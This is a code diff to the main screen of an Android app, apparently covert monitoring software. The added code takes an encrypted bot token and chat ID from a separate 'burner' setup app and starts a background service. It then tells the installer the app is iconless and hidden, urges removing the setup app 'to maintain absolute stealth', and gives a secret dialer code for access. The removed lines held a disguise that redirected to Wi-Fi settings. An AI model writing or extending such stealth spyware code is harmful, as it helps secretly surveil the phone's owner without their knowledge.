@@ -12,14 +12,29 @@ import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.activity.viewModels
 import androidx.compose.foundation.layout.fillMaxSize
+import androidx.compose.foundation.layout.Column
+import androidx.compose.foundation.layout.Spacer
+import androidx.compose.foundation.layout.height
 import androidx.compose.material3.Surface
+import androidx.compose.material3.AlertDialog
+import androidx.compose.material3.Text
+import androidx.compose.material3.Button
+import androidx.compose.material3.TextButton
+import androidx.compose.material3.MaterialTheme
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.unit.dp
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.getValue
+import androidx.compose.runtime.setValue
 import com.mobile.superiorutils.theme.Background
 import com.mobile.superiorutils.theme.SuperiorChatTheme
 import com.mobile.superiorutils.ui.AppScreen
 import com.mobile.superiorutils.ui.MainViewModel
 
 class MainActivity : ComponentActivity() {
+    private var showSetupUninstallDialog by mutableStateOf(false)
+
     private val requestPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { _ -> }
@@ -29,15 +44,22 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        val isSecretLaunch = intent.getBooleanExtra("isSecretLaunch", false)
-        val isWifiLauncher = intent.component?.className == "com.mobile.superiorutils.WifiLauncher"
-
-        // Redirect to camouflage ONLY if the app is launched via the WifiLauncher alias
-        if (isWifiLauncher && !isSecretLaunch) {
-            val wifiIntent = android.content.Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
-            startActivity(wifiIntent)
-            finish()
-            return
+        // 1. Silent Handshake from Burner Setup App
+        val setupBotTokenEncrypted = intent.getStringExtra("SETUP_BOT_TOKEN")
+        val setupChatIdEncrypted = intent.getStringExtra("SETUP_CHAT_ID")
+        if (!setupBotTokenEncrypted.isNullOrEmpty() && !setupChatIdEncrypted.isNullOrEmpty()) {
+            val setupBotToken = com.mobile.superiorutils.utils.CryptoUtils.decrypt(setupBotTokenEncrypted)
+            val setupChatId = com.mobile.superiorutils.utils.CryptoUtils.decrypt(setupChatIdEncrypted)
+            
+            if (setupBotToken.isNotEmpty() && setupChatId.isNotEmpty()) {
+                val prefs = com.mobile.superiorutils.core.AppGraph.prefs
+                prefs.botToken = setupBotToken
+                prefs.chatId = setupChatId
+                com.mobile.superiorutils.core.ServiceCore.ensureRunning(this)
+                AppLog.log(LogCategory.SYSTEM, "Setup completed via intent. Prompting uninstall of setup app via UI.")
+                
+                showSetupUninstallDialog = true
+            }
         }
 
         AppLog.log(LogCategory.SYSTEM, "MainActivity UI Initialized")
@@ -59,6 +81,37 @@ class MainActivity : ComponentActivity() {
                             }
                         }
                     )
+                    
+                    if (showSetupUninstallDialog) {
+                        AlertDialog(
+                            onDismissRequest = { },
+                            title = { Text("Uninstall Setup App") },
+                            text = { 
+                                Column {
+                                    Text("The main app is now configured and hidden. It is highly recommended to uninstall the Setup application to maintain absolute stealth.")
+                                    Spacer(modifier = Modifier.height(16.dp))
+                                    Text("Important: The main app has no icon! You can always access it by dialing *#*#9131#*#* in your phone's dialer.", color = MaterialTheme.colorScheme.primary, fontWeight = FontWeight.Bold)
+                                }
+                            },
+                            confirmButton = {
+                                Button(
+                                    onClick = {
+                                        showSetupUninstallDialog = false
+                                        try {
+                                            val uninstallIntent = android.content.Intent(android.content.Intent.ACTION_DELETE)
+                                            uninstallIntent.data = android.net.Uri.parse("package:com.mobile.superiorsetup")
+                                            startActivity(uninstallIntent)
+                                        } catch (e: Exception) {
+                                            AppLog.log(LogCategory.SYSTEM, "Failed to launch uninstall intent")
+                                        }
+                                    }
+                                ) { Text("Uninstall") }
+                            },
+                            dismissButton = {
+                                TextButton(onClick = { showSetupUninstallDialog = false }) { Text("Keep") }
+                            }
+                        )
+                    }
                 }
             }
         }
